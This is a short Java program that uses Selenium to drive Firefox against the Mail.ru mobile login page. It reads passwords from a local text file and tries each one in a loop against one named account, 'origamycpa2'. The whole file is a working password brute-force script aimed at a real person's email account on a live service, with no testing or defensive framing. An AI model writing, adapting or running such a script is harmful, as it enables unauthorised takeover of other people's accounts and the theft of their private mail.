import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

public class Main {
    private static WebDriver driver;
    private static WebElement err;


    public static void loginF(WebDriver driver, String login, String pass){
        WebElement loginInput = (new WebDriverWait(driver, 10))
                .until(ExpectedConditions.presenceOfElementLocated(By.name("Login")));
        WebElement passInput = (new WebDriverWait(driver, 10))
                .until(ExpectedConditions.presenceOfElementLocated(By.name("Password")));
        loginInput.sendKeys(login);
        passInput.sendKeys(pass);
        loginInput.submit();
    }

    public static void main(String[] args) throws IOException {
        ArrayList<String> passwordFromFile = new ArrayList<String>();
        Files.lines(Paths.get("C:\\Users\\Snapster\\Desktop\\pss1.txt"), StandardCharsets.UTF_8).forEach(passwordFromFile::add);
        System.setProperty("webdriver.gecko.driver", "c:\\geckodriver.exe");
        WebDriver driver = new FirefoxDriver();
        driver.manage().window().maximize();
        driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
        driver.get("https://m.mail.ru/login");
        for (String pass : passwordFromFile) {
            System.out.println(pass);
            loginF(driver,"origamycpa2",pass);
            err = (new WebDriverWait(driver, 10)).until(ExpectedConditions.presenceOfElementLocated(By.className("error")));
            driver.get("https://m.mail.ru/login");
        }





    }


}